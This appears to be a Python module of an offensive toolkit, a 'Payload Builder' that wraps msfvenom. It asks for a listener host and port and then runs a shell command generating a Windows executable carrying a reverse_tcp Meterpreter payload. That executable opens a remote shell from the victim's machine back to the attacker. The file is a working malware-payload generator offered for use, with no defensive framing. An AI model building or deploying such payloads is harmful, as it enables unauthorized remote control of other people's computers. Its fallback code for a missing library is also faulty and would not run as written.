import os
import shutil
import subprocess
from pathlib import Path

try:
    from rich import print
    from rich.prompt import Prompt
    from rich.console import Console
except ImportError:
    print("[!] Rich not found. For better visuals, install with: pip install rich")
    def Prompt(*args, **kwargs): return input(kwargs.get("prompt", ""))
    Console = lambda: None
    Console.print = print

console = Console()

def run():
    console.print("\n[bold cyan]Payload Builder (MSFVenom Wrapper)[/bold cyan]\n")

    lhost = Prompt.ask("[green]LHOST[/green]").strip()
    lport = Prompt.ask("[green]LPORT[/green]").strip()
    output = Prompt.ask("[green]Output filename (no extension)[/green]").strip()

    # Input validation
    if not lhost or not lport.isdigit() or not output.isalnum():
        console.print("[red]✖ Invalid input. Make sure all fields are correctly filled.[/red]")
        return

    # Check for msfvenom
    if not shutil.which("msfvenom"):
        console.print("[red]✖ msfvenom not found. Please install Metasploit first.[/red]")
        return

    output_path = Path.cwd() / f"{output}.exe"
    payload = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output_path}"

    console.print(f"\n[bold yellow]Generated Command:[/bold yellow] {payload}")
    confirm = Prompt.ask("[bold magenta]Execute this command? (y/n)[/bold magenta]", choices=["y", "n"], default="y")

    if confirm == "y":
        try:
            subprocess.run(payload, shell=True, check=True)
            console.print(f"\n[bold green]✔ Payload created successfully:[/bold green] {output_path}")
        except subprocess.CalledProcessError:
            console.print("[red]✖ Failed to build the payload. Check msfvenom installation.[/red]")
    else:
        console.print("[yellow]Cancelled by user.[/yellow]")

if __name__ == "__main__":
    run()
